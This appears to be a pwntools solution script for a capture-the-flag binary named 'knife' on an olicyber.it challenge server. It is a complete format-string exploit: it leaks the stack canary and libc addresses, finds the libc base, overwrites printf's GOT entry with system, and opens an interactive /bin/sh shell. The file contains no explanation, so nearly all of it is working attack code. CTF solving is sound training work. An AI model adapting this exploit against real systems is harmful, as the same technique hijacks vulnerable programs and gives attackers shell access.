#!/usr/bin/env python3

from pwn import *

elf = ELF("./knife_patched")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("knife.challs.olicyber.it", 11006)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b main
                                b *0x4013A1
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r


def main():
    r = conn()

    r.sendline(b'LOAD 1 %21$p')
    r.recvuntil(b'LOAD 1 ')
    canary = int(r.recvline().strip().decode(), 16)
    log.success(f'Leaked stack canary: {hex(canary)}')
    
    r.sendline(b'LOAD 1 %22$p')
    r.recvuntil(b'LOAD 1 ')
    rbp = int(r.recvline().strip().decode(), 16)
    log.success(f'Leaked stack rbp: {hex(rbp)}')
    
    r.sendline(b'STORE 1 ' + p64(elf.got.setbuf))
    r.recvuntil(b'Saved!\n')
    r.sendline(b'STORE 2 ' + p64(elf.got.printf))
    r.recvuntil(b'Saved!\n')
    r.sendline(b'STORE 3 ' + p64(elf.got.fgets))
    r.recvuntil(b'Saved!\n')
    r.sendline(b'STORE 4 ' + p64(elf.got.strtok))
    r.recvuntil(b'Saved!\n')
    r.sendline(b'STORE 5 ' + p64(elf.got.atoi))
    r.recvuntil(b'Saved!\n')

    r.sendline(b'LOAD 1 %9$s|%10$s|%11$s|%12$s')
    r.recvuntil(b'LOAD 1 ')
    leaks = [u64(x.ljust(8, b'\x00')) for x in r.recvline().strip().split(b'|')]
    
    setbuf_leak, printf_leak, fgets_leak, strtok_leak, = leaks
    log.info(f'Leaked setbuf address: {hex(setbuf_leak)}')
    log.info(f'Leaked printf address: {hex(printf_leak)}')
    log.info(f'Leaked fgets address: {hex(fgets_leak)}')
    log.info(f'Leaked strtok address: {hex(strtok_leak)}')
    
    r.sendline(b'LOAD 1 %13$s')
    r.recvuntil(b'LOAD 1 ')
    atoi_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
    log.info(f'Leaked atoi address: {hex(atoi_leak)}')
    
    log.debug('Now get the tight libc from libc-database!') # libc6_2.35-0ubuntu3.12_amd64 https://libc.blukat.me/?q=printf%3A5a6f0%2Csetbuf%3A81fe0%2Cfgets%3A79380%2Cstrtok%3Aa3340%2Catoi%3A3d640&l=libc6_2.35-0ubuntu3.12_amd64
    
    libc = ELF('./libc.so.6')
    libc.address = atoi_leak - libc.symbols.atoi
    log.success(f'Libc base address: {hex(libc.address)}')
    
    print('setbuf:', hex(libc.symbols.setbuf), libc.symbols.setbuf == setbuf_leak)
    print('printf:', hex(libc.symbols.printf), libc.symbols.printf == printf_leak)
    print('fgets:', hex(libc.symbols.fgets), libc.symbols.fgets == fgets_leak)
    print('strtok:', hex(libc.symbols.strtok), libc.symbols.strtok == strtok_leak)
    print('atoi:', hex(libc.symbols.atoi), libc.symbols.atoi == atoi_leak)

    r.sendline(b'STORE 1 ' + p64(elf.got.printf))
    r.recvuntil(b'Saved!\n')
    r.sendline(b'STORE 2 ' + p64(elf.got.printf+2))
    r.recvuntil(b'Saved!\n')
    r.sendline(b'STORE 3 /bin/sh')
    r.recvuntil(b'Saved!\n')
    
    payload = 'LOAD 3 %' + str(((libc.symbols.system >> 16) & 0xff) - 7) + 'c%10$hhn%' + str((libc.symbols.system & 0xffff) - ((libc.symbols.system >> 16) & 0xff)) + 'c%9$hn'
    print(payload, len(payload))
    r.sendline(payload.encode())

    r.interactive()


if __name__ == "__main__":
    main()
